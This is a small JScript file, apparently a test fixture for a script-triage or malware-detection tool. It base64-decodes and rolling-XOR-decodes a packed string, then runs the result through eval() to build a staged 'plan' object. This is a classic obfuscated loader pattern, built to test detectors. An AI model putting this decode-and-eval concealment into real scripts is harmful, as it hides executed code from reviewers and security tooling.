// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
function decode_566a2150(SoUrCeByTeS) {
  var DeCoDeDByTeS = [];
  var previous = 192;
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push(SoUrCeByTeS[i] ^ previous); previous = SoUrCeByTeS[i]; }
  return DeCoDeDByTeS;
}
function recover_72cd05dd() {
  var packedText = "u5nqnvuL+Nrgu5n9mPuU8JXKr8KgxaHFoMTmyuif7YTwlcqsxanM7rOfvdy42anduMro0vCjwLLbq9+22L+R177St+Sd7pr/kt2/1bDTp4Wpi/2c8IXgk7GL8NKx0L3NrMWizJP6nryGpMemy7vas9S6l6bApZCoyfrJ+Mnrx+WD6objvMyt2bGTqYvI8q7yp9Sxw7DssOCV95vykc2R2azCtsSh0qHtjO6y7p3piO+Kp5bwlaCY+cr5yPnXs9KmhPnV94TwkfaT0L/KpNDyyPqH";

  var SoUrCeByTeS = decodeBase64(packedText);



  var invoke = function(block, value) { return block(value); };

  var DeCoDeDByTeS = invoke(decode_566a2150, SoUrCeByTeS);

  var textParts = [];

  for (var bi = 0; bi < DeCoDeDByTeS.length; bi++) { textParts.push(String.fromCharCode(DeCoDeDByTeS[bi])); }

  var DeScRiPtOrTeXt = textParts.join("");

  return DeScRiPtOrTeXt;
}
function inspect_7611f8bd() {
  var DeScRiPtOr = eval("(" + recover_72cd05dd() + ")");
  var PlAn = new Object();
  PlAn["steps"] = DeScRiPtOr["steps"];
  PlAn["adapter"] = DeScRiPtOr["adapter"];
  PlAn["values"] = DeScRiPtOr["values"];
  PlAn["stageCount"] = DeScRiPtOr["stageCount"];
  return PlAn;
}
